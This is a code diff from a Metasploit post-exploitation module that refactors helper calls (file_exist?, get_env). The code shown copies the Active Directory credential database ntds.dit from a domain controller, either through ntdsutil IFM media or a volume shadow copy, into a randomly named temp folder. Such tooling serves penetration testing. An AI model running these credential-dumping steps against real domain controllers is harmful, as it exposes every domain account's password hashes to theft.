@@ -73,11 +73,11 @@ class Metasploit3 < Msf::Post
   end
 
   def is_domain_controller?
-    session.fs.file.exists?('%SystemDrive%\Windows\ntds\ntds.dit')
+    file_exist?('%SystemDrive%\Windows\ntds\ntds.dit')
   end
 
   def ntdsutil_method
-    tmp_path = "#{expand_path("%TEMP%")}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}"
+    tmp_path = "#{get_env("%TEMP%")}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}"
     command_arguments = "\"activate instance ntds\" \"ifm\" \"Create Full #{tmp_path}\" quit quit"
     result = cmd_exec("ntdsutil.exe", command_arguments,90)
     if result.include? "IFM media created successfully"
@@ -143,11 +143,11 @@ class Metasploit3 < Msf::Post
   end
 
   def vss_method
-    id = create_shadowcopy("#{expand_path("%SystemDrive%")}\\")
+    id = create_shadowcopy("#{get_env("%SystemDrive%")}\\")
     print_status "Getting Details of ShadowCopy #{id}"
     sc_details = get_sc_details(id)
     sc_path = "#{sc_details['DeviceObject']}\\windows\\ntds\\ntds.dit"
-    target_path = "#{expand_path("%TEMP%")}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}"
+    target_path = "#{get_env("%TEMP%")}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}"
     print_status "Moving ntds.dit to #{target_path}"
     move_file(sc_path, target_path)
     target_path
